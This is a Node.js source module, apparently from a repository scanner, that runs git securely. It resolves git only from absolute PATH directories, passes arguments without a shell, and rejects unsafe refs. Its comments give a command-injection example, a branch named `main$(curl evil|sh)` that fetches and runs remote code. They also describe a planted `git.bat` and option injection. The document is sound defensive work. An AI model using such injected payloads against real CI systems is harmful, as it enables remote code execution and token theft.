import { execFileSync, spawn } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

/**
 * WHICH `git` RUNS - NEVER ONE THE SCANNED REPOSITORY SHIPS.
 *
 * ⚠ On Windows a bare `git` is looked for in the working directory BEFORE PATH:
 * cmd.exe does it for `execSync('git …')` (trying git.exe, git.bat, git.cmd…),
 * and Node does it for `execFileSync('git')` (git.exe, git.com) unless
 * NoDefaultCurrentDirectoryInExePath is set - which on a developer's machine or
 * a Windows CI runner it normally is not. The working directory is the
 * repository being checked, so a `git.bat` committed to a pull request ran the
 * moment `shomra check` looked at it - with the job's token in its environment,
 * or on the laptop of whoever opened the repo in the editor extension. git is
 * resolved here against ABSOLUTE PATH directories only and always run by its full
 * path; no git on PATH means no git, which every caller already treats as
 * "not a repository".
 */
export function resolveOnPath(name, env = process.env, platform = process.platform) {
  const p = platform === 'win32' ? path.win32 : path.posix;
  const names = platform === 'win32' ? [`${name}.exe`, `${name}.com`] : [name];
  for (const raw of String(env.PATH ?? env.Path ?? '').split(p.delimiter)) {
    const dir = raw.trim().replace(/^"(.*)"$/, '$1');
    if (!dir || !p.isAbsolute(dir)) continue;
    for (const n of names) {
      const candidate = p.join(dir, n);
      try {
        if (!fs.statSync(candidate).isFile()) continue;
        if (platform !== 'win32') fs.accessSync(candidate, fs.constants.X_OK);
        return candidate;
      } catch {
        /* not in this directory */
      }
    }
  }
  return null;
}

let gitBinary;
function gitPath() {
  if (gitBinary === undefined) gitBinary = resolveOnPath('git');
  return gitBinary;
}

/**
 * GIT, WITHOUT A SHELL.
 *
 * ⚠ `execSync(`git ${args}`)` handed the whole line to a shell, and part of that
 * line was a BRANCH NAME - from `--base`, from `GITHUB_BASE_REF`, or from the
 * pull-request event payload. `$(...)`, `;` and `|` are all legal in a git ref,
 * so a branch called `main$(curl evil|sh)` ran inside the customer's CI job,
 * with the job's GitHub token in its environment. Arguments now go to git as an
 * argv array, where a metacharacter is just a character.
 */
export function git(args, { cwd, timeout = 5000, maxBuffer = 16 * 1024 * 1024 } = {}) {
  const bin = gitPath();
  if (!bin) return null;
  try {
    return execFileSync(bin, args, { cwd, stdio: ['ignore', 'pipe', 'ignore'], timeout, maxBuffer, windowsHide: true }).toString();
  } catch {
    return null;
  }
}

export function gitHooksPath(root) {
  const dir = git(['rev-parse', '--git-path', 'hooks'], { cwd: root, timeout: 3000 })?.trim();
  if (!dir) return null;
  return path.isAbsolute(dir) ? dir : path.join(root, dir);
}

export function gitBuffer(args, { cwd, input, timeout = 5000, maxBuffer = 16 * 1024 * 1024 } = {}) {
  const bin = gitPath();
  if (!bin) return null;
  try {
    return execFileSync(bin, args, { cwd, input, stdio: [input === undefined ? 'ignore' : 'pipe', 'pipe', 'ignore'], timeout, maxBuffer, windowsHide: true });
  } catch {
    return null;
  }
}

export function gitBlobWindow(oid, { cwd, half, timeout = 20000 }) {
  const bin = gitPath();
  if (!bin || !/^[0-9a-f]{40,64}$/.test(String(oid))) return Promise.resolve(null);
  return new Promise((resolve) => {
    let child;
    try {
      child = spawn(bin, ['cat-file', 'blob', oid], { cwd, stdio: ['ignore', 'pipe', 'ignore'], windowsHide: true });
    } catch {
      resolve(null);
      return;
    }
    const head = [];
    let headLength = 0;
    const tail = [];
    let tailLength = 0;
    let total = 0;
    const timer = setTimeout(() => child.kill('SIGKILL'), timeout);
    child.stdout.on('data', (chunk) => {
      total += chunk.length;
      let rest = chunk;
      if (headLength < half) {
        const take = rest.subarray(0, half - headLength);
        head.push(take);
        headLength += take.length;
        rest = rest.subarray(take.length);
      }
      if (!rest.length) return;
      tail.push(rest);
      tailLength += rest.length;
      while (tail.length > 1 && tailLength - tail[0].length >= half) tailLength -= tail.shift().length;
    });
    child.on('error', () => {
      clearTimeout(timer);
      resolve(null);
    });
    child.on('close', (code) => {
      clearTimeout(timer);
      if (code !== 0) {
        resolve(null);
        return;
      }
      const first = Buffer.concat(head);
      const last = Buffer.concat(tail);
      const end = last.subarray(Math.max(0, last.length - half));
      const unread = Math.max(0, total - first.length - end.length);
      resolve({ content: unread ? `${first.toString('utf8')}\n${end.toString('utf8')}` : Buffer.concat([first, last]).toString('utf8'), unread, size: total });
    });
  });
}

export function gitLines(args, { cwd, timeout = 120000, onLine }) {
  const bin = gitPath();
  if (!bin) return Promise.resolve({ ok: false, reason: 'git is not installed' });
  return new Promise((resolve) => {
    let child;
    try {
      child = spawn(bin, args, { cwd, stdio: ['ignore', 'pipe', 'ignore'], windowsHide: true });
    } catch (error) {
      resolve({ ok: false, reason: error.message });
      return;
    }
    let timedOut = false;
    const timer = setTimeout(() => {
      timedOut = true;
      child.kill('SIGKILL');
    }, timeout);
    let rest = '';
    child.stdout.setEncoding('utf8');
    child.stdout.on('data', (chunk) => {
      const text = rest + chunk;
      const lines = text.split('\n');
      rest = lines.pop();
      for (const line of lines) onLine(line);
    });
    child.on('error', (error) => {
      clearTimeout(timer);
      resolve({ ok: false, reason: error.message });
    });
    child.on('close', (code) => {
      clearTimeout(timer);
      if (rest) onLine(rest);
      if (timedOut) resolve({ ok: false, reason: `timed out after ${Math.round(timeout / 1000)}s` });
      else resolve(code === 0 ? { ok: true } : { ok: false, reason: `git exited with code ${code}` });
    });
  });
}

/**
 * A ref we are willing to pass as a REVISION argument.
 *
 * ⚠ argv closes the shell hole, not the option hole: a ref beginning with `-` is
 * read by git as a flag (`--output=/etc/...`). Refused, along with anything git's
 * own check-ref-format would refuse.
 */
export function safeRef(ref) {
  const r = String(ref ?? '').trim();
  if (!r || r.length > 200) return null;
  if (r.startsWith('-') || r.includes('..') || r.endsWith('.lock') || r.endsWith('/') || r.endsWith('.')) return null;
  if (!/^[A-Za-z0-9._\/+-]+$/.test(r)) return null;
  return r;
}
